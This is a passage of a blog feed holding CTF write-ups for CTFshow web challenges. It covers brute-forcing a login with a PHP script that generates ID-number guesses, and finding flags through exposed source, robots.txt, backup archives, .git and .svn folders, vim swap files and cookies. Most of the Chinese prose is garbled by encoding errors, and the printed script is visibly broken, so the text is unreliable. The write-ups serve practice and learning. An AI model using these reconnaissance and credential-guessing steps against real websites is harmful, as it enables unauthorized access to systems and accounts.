src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841398062-c31cda10-af2d-4736-8121-f604790b2cf7.png" alt="image.png"><br>çˆ†ç ´çš„è¯å¯èƒ½è´¹ç‚¹åŠ²äº†<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841574076-21b6d96c-5e80-4497-bd55-a7e4f7f0384c.png" alt="image.png"></p><h1 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h1><h2 id="æ–¹æ¡ˆä¸€-1"><a href="#æ–¹æ¡ˆä¸€-1" class="headerlink" title="æ–¹æ¡ˆä¸€"></a>æ–¹æ¡ˆä¸€</h2><p>è¿™é¢˜æœ‰ç‚¹æ„æ€ï¼Œä¸Šæ¥å°±æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841752959-36877d3f-2eca-42a6-b8e8-70ab983382da.png" alt="image.png"><br>ä¸‹æ–¹æœ‰ä¸€ä¸ªå½•å–åå•è·å–ï¼Œä¸‹è½½ä¸€ä¸‹ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841938577-d558f1b0-499c-4b86-a062-0528b771ee58.png" alt="image.png"><br>ç½‘é¡µä¸­è¿˜æœ‰ä¸€ä¸ªå­¦ç±ç®¡ç†ç³»ç»Ÿï¼Œä¼°è®¡å°±æ˜¯ç”¨è¿™ä¸ªæ¥æŸ¥æ‰¾äº†ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•çˆ†ç ´è¿™ä¸ªé¡µé¢ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842002490-837a816c-6a10-4154-8a59-f4f2f9033cd3.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842443902-30f3d0b2-3f79-443d-afa2-ae744d5a6792.png" alt="image.png"><br>ä¿®æ”¹payloadç±»å‹<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842468948-8d5e1435-2827-455c-b534-16d03b9b06a2.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842490721-bc38685b-9fc7-4cbf-a36c-a8951f791ee3.png" alt="image.png"><br>ç„¶åç›´æ¥æŸ¥è¯¢ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842525622-e75d02c1-6eb3-4b39-bc82-a824d5041a80.png" alt="image.png"><br>è¿™ä¸‹å°±å¾—åˆ°äº†è´¦å·ï¼š02015237 å¯†ç ï¼š621022199002015237<br>è¿”å›å»ç™»é™†é¡µé¢ã€‚ç™»å½•å³å¯<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842624036-ffaab3b1-0968-4738-a3b2-4762e09e66c0.png" alt="image.png"></p><h2 id="æ–¹æ¡ˆäºŒ"><a href="#æ–¹æ¡ˆäºŒ" class="headerlink" title="æ–¹æ¡ˆäºŒ"></a>æ–¹æ¡ˆäºŒ</h2><p>wpæä¾›çš„è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//621022********5237</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;zid.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$year</span>=<span class="number">1990</span>;<span class="variable">$year</span>&lt;<span class="number">1993</span>;<span class="variable">$year</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$mon</span>=<span class="number">1</span>;<span class="variable">$mon</span>&lt;<span class="number">10</span>;<span class="variable">$mon</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$day</span>=<span class="number">01</span>;<span class="variable">$day</span>&lt;<span class="number">10</span>;<span class="variable">$day</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$txt</span>=(<span class="string">&#x27;621022&#x27;</span>.<span class="variable">$year</span>.<span class="string">&#x27;0&#x27;</span>.<span class="variable">$mon</span>.<span class="string">&#x27;0&#x27;</span>.<span class="variable">$day</span>.<span class="string">&#x27;5237&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; f</span><br><span class="line"><span class="keyword">or</span>(<span class="variable">$year</span>=<span class="number">1990</span>;<span class="variable">$year</span>&lt;<span class="number">1993</span>;<span class="variable">$year</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$mon</span>=<span class="number">1</span>;<span class="variable">$mon</span>&lt;<span class="number">10</span>;<span class="variable">$mon</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$day</span>=<span class="number">10</span>;<span class="variable">$day</span>&lt;=<span class="number">31</span>;<span class="variable">$day</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$txt</span>=(<span class="string">&#x27;621022&#x27;</span>.<span class="variable">$year</span>.<span class="string">&quot;0&quot;</span>.<span class="variable">$mon</span>.<span class="variable">$day</span>.<span class="string">&#x27;5237&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; f</span><br><span class="line"><span class="keyword">or</span>(<span class="variable">$year</span>=<span class="number">1990</span>;<span class="variable">$year</span>&lt;<span class="number">1993</span>;<span class="variable">$year</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$mon</span>=<span class="number">10</span>;<span class="variable">$mon</span>&lt;=<span class="number">12</span>;<span class="variable">$mon</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$day</span>=<span class="number">10</span>;<span class="variable">$day</span>&lt;=<span class="number">31</span>;<span class="variable">$day</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$txt</span>=(<span class="string">&#x27;621022&#x27;</span>.<span class="variable">$year</span>.<span class="variable">$mon</span>.<span class="variable">$day</span>.<span class="string">&#x27;5237&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; f</span><br><span class="line"><span class="keyword">or</span>(<span class="variable">$year</span>=<span class="number">1990</span>;<span class="variable">$year</span>&lt;<span class="number">1993</span>;<span class="variable">$year</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$mon</span>=<span class="number">10</span>;<span class="variable">$mon</span>&lt;=<span class="number">12</span>;<span class="variable">$mon</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$day</span>=<span class="number">01</span>;<span class="variable">$day</span>&lt;<span class="number">10</span>;<span class="variable">$day</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$txt</span>=(<span class="string">&#x27;621022&#x27;</span>.<span class="variable">$year</span>.<span class="variable">$mon</span>.<span class="string">&quot;0&quot;</span>.<span class="variable">$day</span>.<span class="string">&#x27;5237&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; f</span><br><span class="line"><span class="title function_ invoke__">close</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><h1 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h1><p>ä¸Šæ¥é¡µé¢ä¸­ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œä½†æ˜¯æ³¨æ„åˆ°åŸŸåä¸­æœ‰è¹Šè··ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842814104-e64b62a2-3eca-40a7-86fb-7f2805ba5979.png" alt="image.png"><br>æç¤ºé‡Œé¢å†™äº†åªç”¨çˆ†ç ´ç›®å½•å³å¯ï¼Œå› æ­¤ä¿®æ”¹intruderã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677844522366-e4a15f61-248c-4cb6-a093-587a7d4381a4.png" alt="image.png"></p><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>ä»–è¯´çš„çˆ†ç ´ç›®å½•ä¿®æ”¹çš„payloadåº”è¯¥æ˜¯ï¼š<code>/0/1/</code>è€Œä¸æ˜¯<code>/0/1</code>ï¼Œåè€…ä¼šè¿”å›é‡å®šå‘301</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web1-20ä¿¡æ¯æ”¶é›†ç¯‡</title>
      <link href="/2023/03/13/web1-20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/"/>
      <url>/2023/03/13/web1-20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><blockquote><p>å¼€å‘æ³¨é‡ŠæœªåŠæ—¶åˆ é™¤</p></blockquote><p>ç›´æ¥f12æºä»£ç å†…å­˜åœ¨flag</p><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><blockquote><p>jså‰å°æ‹¦æˆª === æ— æ•ˆæ“ä½œ</p></blockquote><p>è™½ç„¶ç¦æ­¢äº†å³é”®å’Œf12æ¥æ‰“å¼€å¼€å‘è€…æ¨¡å¼ï¼Œä½†æ˜¯chromeå¯ä»¥åœ¨æ›´å¤šå·¥å…·ä¸­æ‰¾åˆ°å¼€å‘å·¥å…·å¹¶æ‰“å¼€ã€‚flagåœ¨æºä»£ç ä¸­ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677482893019-176e18a5-68f2-4408-8e72-8fbdacff4286.png" alt="image.png"></p><h2 id="others"><a href="#others" class="headerlink" title="others"></a>others</h2><p>çœ‹äº†wpä¹‹åå‘ç°è¿˜æœ‰å‡ ç§æ–¹æ³•ï¼š</p><ul><li>åœ¨urlå‰é¢åŠ ä¸Š<code>view-source:</code></li><li>ä¸‹è½½æºç </li><li>åœ¨å¾ˆçŸ­çš„æ—¶é—´å†…æŒ‰f5å’Œf12</li><li><code>ctrl + U</code>æŸ¥çœ‹æºä»£ç </li><li>æ‰“å¼€ä¸€ä¸ªç©ºç™½ç½‘é¡µï¼Œç„¶åæŒ‰F12ï¼Œæ¥ç€å†æŠŠç½‘å€å¤åˆ¶è¿›å»å¹¶å›è½¦</li></ul><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><blockquote><p>æ²¡æ€è·¯çš„æ—¶å€™æŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Œå¯èƒ½ä¼šæœ‰æ„å¤–æ”¶è·</p></blockquote><p>ç›´æ¥burpsuiteæŠ“åŒ…ï¼Œè¿”å›åŒ…ä¸­åœ¨è¯·æ±‚å¤´ä¸­å­˜åœ¨flagã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677483548818-27ec80b1-54a1-4dab-846c-caaf3559d6d1.png" alt="image.png"></p><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><blockquote><p>æ€»æœ‰äººæŠŠåå°åœ°å€å†™å…¥robotsï¼Œå¸®é»‘é˜”å¤§ä½¬ä»¬å¼•è·¯ã€‚</p></blockquote><p>æç¤ºçš„å·²ç»å¾ˆæ˜æ˜¾äº†ï¼Œè®¿é—®å¯¹åº”çš„åçˆ¬robotsé¡µé¢ï¼š<code>/robots.txt</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677483894393-32a3362c-c5f6-4237-b686-ce72a15d9d05.png" alt="image.png"><br>å†æ¬¡è®¿é—®å¯¹åº”é¡µé¢ï¼Œå¾—åˆ°flagã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677483939660-670394f2-b08d-4c8c-b197-afd1b1cc11f3.png" alt="image.png"></p><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><blockquote><p>phpsæºç æ³„éœ²æœ‰æ—¶å€™èƒ½å¸®ä¸Šå¿™</p></blockquote><p>æ ¹æ®æç¤ºï¼Œè¿™é“é¢˜ä¼°è®¡éœ€è¦æ‰«å¤‡ä»½æ–‡ä»¶äº†ã€‚å› æ­¤å°è¯•å»æ‰«ï¼Œä½†æ˜¯æ¢äº†å¥½å‡ ä¸ªè½¯ä»¶éƒ½æ²¡æœ‰æ‰«åˆ°ï¼Œçœ‹äº†wpï¼Œå‘ç°æ˜¯ï¼š<code>index.phps</code>æ–‡ä»¶ã€‚<br>è®¿é—®å¯¹åº”åœ°å€ä¸‹è½½æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°flagã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677487363497-cfbb986a-e286-47d7-8034-1a70668ca14b.png" alt="image.png"></p><h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><blockquote><p>è§£å‹æºç åˆ°å½“å‰ç›®å½•ï¼Œæµ‹è¯•æ­£å¸¸ï¼Œæ”¶å·¥</p></blockquote><p>ä¸€çœ¼ä¸çœŸï¼Œè¿˜æ˜¯æ‰«ï¼Œç»§ç»­æ‰«ã€‚è¿™ä¸ªçš„ç›®æ ‡æ–‡ä»¶æ˜¯<code>www.zip</code>æ‰«å‡ºæ¥å†è§£å‹æ‰“å¼€å³å¯ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677487513876-637eeffe-876d-4fa7-bfa7-171b5c25a78a.png" alt="image.png"></p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><blockquote><p>ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</p></blockquote><p>æ ¹æ®æç¤ºå¯ä»¥åˆ¤æ–­å‡ºæ˜¯gitæ³„éœ²çš„é¢˜ç›®ï¼ˆæ‰«ä¹Ÿå¯ä»¥ï¼‰ï¼Œç›´æ¥è®¿é—®gitä¸­çš„<code>index.php</code>æ–‡ä»¶ï¼Œè®¿é—®åœ°å€ï¼š<br><code>url/.git/index.php</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677487895563-63a6899d-9a87-46a6-9376-d5610eed2ea8.png" alt="image.png"></p><h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><blockquote><p>ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</p></blockquote><p>é™¤äº†gitç‰ˆæœ¬æ§åˆ¶ä¹‹å¤–ï¼Œè¿™é“é¢˜ä½¿ç”¨äº†svnæ§åˆ¶ç‰ˆæœ¬ã€‚disreachæ‰«æï¼Œå‘ç°æœ‰<code>.svn</code>æ³„éœ²ã€‚å› æ­¤æˆ‘ä»¬ç›´æ¥è®¿é—®ï¼š<code>url/.svn</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677488199030-63ba484d-0295-43c6-ae30-881cdee6af47.png" alt="image.png"></p><h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><blockquote><p>å‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒvimæ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†</p></blockquote><p>è€ƒå¯Ÿçš„æ˜¯vimç¼“å­˜æ³„éœ²ï¼Œå³ç±»ä¼¼windowsä¸Šç¼–è¾‘wordæ–‡ä»¶ï¼Œlinuxåœ¨vimç¼–è¾‘æ–‡ä»¶æ—¶ä¹Ÿä¼šäº§ç”Ÿç¼“å­˜æ–‡ä»¶ï¼Œå¦‚æœåƒé¢˜ç›®ä¸€æ ·æ„å¤–é€€å‡ºåˆ™ä¼šä¿å­˜ç¼“å­˜æ–‡ä»¶ã€‚<br>ä»¥index.phpæ¥è¯´ï¼Œç¬¬ä¸€æ¬¡é€€å‡ºåï¼Œç¼“å­˜æ–‡ä»¶åä¸º .index.php.swpï¼Œç¬¬äºŒæ¬¡é€€å‡ºåï¼Œç¼“å­˜æ–‡ä»¶åä¸º.index.php.swo,ç¬¬ä¸‰æ¬¡é€€å‡ºåæ–‡ä»¶åä¸º.index.php.swnã€‚<br>å› æ­¤ç›´æ¥è®¿é—®<code>url/index.php.swp</code>å³å¯è·å–åˆ°æ–‡ä»¶ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677488692685-e9c7a051-b68e-4f1d-8382-f1083fbfc606.png" alt="image.png"></p><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>linuxæ–‡ä»¶å‰é¢è¿™ä¸ªç‚¹æŒ‡çš„æ˜¯éšè—æ–‡ä»¶çš„æ„æ€ï¼Œå¯èƒ½ä¸éœ€è¦åŠ ç‚¹ä¹Ÿå¯ä»¥è®¿é—®ã€‚</p><h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><blockquote><p>cookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ®</p></blockquote><p>æ ¹æ®é¢˜ç›®ï¼Œå¯ä»¥çŒœæƒ³å¯èƒ½æ˜¯cookieé‡Œé¢è—ä¸œè¥¿äº†ï¼Œå› æ­¤å°è¯•f12-ç½‘ç»œç›‘æµ‹ï¼š<br>åœ¨å›ä¼ åŒ…ä¸­å‘ç°ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677489361977-d6445a0a-9884-4913-8885-8c470b582a18.png" alt="image.png"></p><h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><blockquote><p>åŸŸåå…¶å®ä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œæ¯”å¦‚flag.ctfshow.com å°±éšè—äº†ä¸€æ¡ä¿¡æ¯ã€</p></blockquote><h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><blockquote><p>æœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç </p></blockquote><p>è®¿é—®ç½‘ç«™ï¼Œè®¿é—®<code>robots.txt</code>ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659086016-6482b784-18cc-4bd5-becd-347016c50a89.png" alt="image.png"><br>è®¿é—®åœ°å€ï¼Œå‘ç°éœ€è¦è´¦å·å¯†ç ï¼Œæ ¹æ®æç¤ºï¼ŒçŒœæƒ³è´¦å·adminï¼Œå¯†ç ä¸ºå¯¹ç½‘é¡µæœ«å°¾ç”µè¯ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659155796-072b792a-f76d-449f-8574-15e07c5d1825.png" alt="image.png"><br>æˆåŠŸç™»å½•è·å–åˆ°flagã€‚</p><h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><blockquote><p>æŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç </p></blockquote><p>æ ¹æ®æç¤ºï¼Œå¯ä»¥åœ¨ä¸»é¡µä¸­æœ€åº•éƒ¨å‘ç°æœ‰<code>document</code>ï¼Œä¸‹è½½æ–‡æ¡£ã€‚æ–‡æ¡£ä¸­å³æœ‰ç™»å½•è´¦å·å¯†ç ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659750747-db64cb0e-fc5a-4cb4-bc94-4d6fffe1071f.png" alt="image.png"><br>ç™»å½•å¯¹åº”åœ°å€ï¼Œå¹¶è¾“å…¥å¯¹åº”è´¦å·å¯†ç ï¼Œè·å¾—flagã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659800472-5c848c58-2560-4e62-867c-48ecbc15cc4d.png" alt="image.png"></p><h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><blockquote><p>æœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦(editor)çš„ä¿¡æ¯,é»˜è®¤é…ç½®å®³æ­»äºº</p></blockquote><p>æŸ¥çœ‹æºç æºç ä¸­ä¸Šä¼ å›¾ç‰‡çš„ä½ç½®æš´éœ²äº†æ¯”ç¼–è¾‘å™¨åœ°å€ï¼š<code>/editor</code>ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥æ‰«æå‡ºæ¥ï¼‰<br>ç„¶åæ ¹æ®æç¤ºï¼Œåœ¨æ’å…¥æ–‡ä»¶ä¸­é€‰æ‹©æ–‡ä»¶ç©ºé—´ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661001765-ed170db3-ec48-48ff-8e84-fa8e456d352d.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661012463-5891556a-d14c-40b1-abc5-11107aa67e4f.png" alt="image.png"><br>ç»è¿‡æœç´¢ï¼Œå‘ç°å¦‚ä¸‹åœ°å€ï¼š<code>/editor/attached/file/var/www/html/nothinghere/fl000g.txt</code><br>å‰é¢æ˜¯ç½‘ç«™æ ¹ç›®å½•ï¼Œç›´æ¥è®¿é—®ï¼š<code>nothinghere/fl000g.txt</code>å¾—åˆ°flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661160331-f88eb97f-1984-4d6f-af3a-fe7680e70d73.png" alt="image.png"></p><h1 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h1><blockquote><p>å…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ</p></blockquote><p>ç»è¿‡æ‰«æå‘ç°å­˜åœ¨<code>/admin</code>è®¿é—®ã€‚å†…æœ‰ä¸€ä¸ªç™»é™†ç³»ç»Ÿï¼Œç³»ç»Ÿå­˜åœ¨å¿˜è®°å¯†ç æ‰¾å›ï¼Œå‘ç°å¯†ä¿é—®é¢˜ä¸ºå±…ä½åœ°å€ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661547444-07d88c82-2efe-47b1-af59-eb3a41fcf40c.png" alt="image.png"><br>å¯ä»¥æ ¹æ®aboutå…³äºç•Œé¢æœ€ä¸‹æ–¹çš„ç”µè¯å·æŸ¥è¯¢æ‰€å±åœ°ã€‚ä½†æ˜¯æŸ¥è¯¢äº†å‘ç°ç”µè¯ä¸å­˜åœ¨ã€‚å‘ç°ä¸»é¡µæœ‰qqé‚®ç®±ï¼Œç”¨qqæŸ¥è¯¢ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662044749-a963e17b-36fb-406e-aca0-50e68524087f.png" alt="image.png"><br>è¾“å…¥åé‡ç½®å¯†ç ï¼Œç™»å½•è·å–åˆ°flagï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662272962-b2d18581-e88b-4f85-8830-7ee5dc25dd01.png" alt="image.png"></p><h1 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h1><blockquote><p>å¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ²</p></blockquote><p>æ ¹æ®æç¤ºï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°è¿™é“é¢˜ç”¨åˆ°äº†æ¢é’ˆï¼Œè®¿é—®ï¼š<code>tz.php</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662498104-ab17d3fd-d09e-4d37-bdb8-c279c78be35d.png" alt="image.png"><br>æˆ‘ä»¬å¯ä»¥åœ¨phpç›¸å…³å‚æ•°ä¸€æ ä¸­æŸ¥çœ‹åˆ°<code>phpinfo()</code>ï¼Œåœ¨é¡µé¢ä¸­æœç´¢flagï¼Œå‘ç°åœ¨ç¯å¢ƒä¸­æœ‰flagå­—æ®µï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662734509-e50900a3-d143-43b1-858e-e1d83fbbae0c.png" alt="image.png"></p><h1 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h1><blockquote><p>å¤‡ä»½çš„sqlæ–‡ä»¶ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯</p></blockquote><p>æ‰«ï¼Œå‘ç°å®ƒçš„å¤‡ä»½åç§°ä¸ºï¼š<code>backup.sql</code>ï¼Œä¸‹è½½å¯¹åº”åŒ…ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶å†…æœ‰flagï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663254137-edde1c49-2d30-4625-b7c7-596ad117da73.png" alt="image.png"></p><h1 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h1><blockquote><p>ä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç©101åˆ†ç»™ä½ flag</p></blockquote><p>æ¸¸æˆé¢˜ï¼Œç›´æ¥æŸ¥çœ‹æºä»£ç ï¼ŒæŸ¥çœ‹<code>Flappy_js.js</code>æ–‡ä»¶<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663432915-94befbb5-3da7-4037-9c98-dc3add8ab8d7.png" alt="image.png"><br>å‘ç°é‡Œé¢æœ‰å¯¹åˆ†æ•°åˆ¤æ–­ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663480194-bc8f1dc4-7e5e-4e9a-9229-a2d5c2b7ae4e.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663488999-1aeb987f-2d46-4d08-addd-57bc00045cf7.png" alt="image.png"><br>æ ¹æ®ç»“æœè®¿é—®å¯¹åº”<code>110.php</code>è·å¾—flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663518588-a91f1d72-0f50-4610-80ec-6e350e3f0e9d.png" alt="image.png"></p><h1 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h1><blockquote><p>å¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº†</p></blockquote><p>f12æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°phpä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;fakeflag&quot;</span></span><br><span class="line"><span class="variable">$u</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$p</span> ===<span 